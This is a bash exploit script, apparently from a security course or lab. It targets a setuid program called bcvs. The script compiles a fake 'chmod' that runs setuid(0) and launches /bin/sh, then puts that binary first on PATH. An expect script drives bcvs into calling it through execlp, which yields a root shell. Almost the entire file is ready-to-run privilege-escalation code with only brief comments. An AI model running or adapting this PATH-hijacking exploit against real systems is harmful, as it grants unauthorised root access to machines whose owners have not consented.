#!/bin/bash

# Exploit 2
# Take advantage of bcvs using execlp to call chmod. 
# We can redirect the PATH variable to a new directory containing a fake binary for chmod which sets us as root and starts a shell.

DIRNAME=sploit2
rm -rf $DIRNAME

# Create directory to work in for this exploit
mkdir $DIRNAME
cd $DIRNAME

# Create repository
mkdir .bcvs
touch .bcvs/block.list

# Create a fake binary that will set us as root and run /bin/sh 
echo "Create helper files"
cat > fake.c << EOF
#include <unistd.h>
int main() {
	setuid(0);
	return execl ("/bin/sh", "sh", NULL);
}
EOF

# Create an expect script to automate user input
cat > expect.sh << EOF
#!/usr/bin/expect -f

set timeout -1

spawn /opt/bcvs/bcvs co test.txt

expect "Please write a SHORT explanation:\r\n"

send -- "test\n"

interact
EOF
chmod +x expect.sh

# Create the file to checkout
touch {"test.txt",".bcvs/test.txt"}

# Create a fakebin directory to store our new binary
mkdir -p fakebin

# Compile the fake binary
echo "Compile fake.c"
gcc fake.c -o fakebin/chmod

# Set the PATH variable so execlp() in bcvs uses our custom PATH to fakebin
echo "Set PATH"
PATH=fakebin:$PATH

# Now call bcvs
echo "Call bcvs"
./expect.sh

# Clean up our files
echo "Clean up helper files"
cd ../
rm -rf $DIRNAME
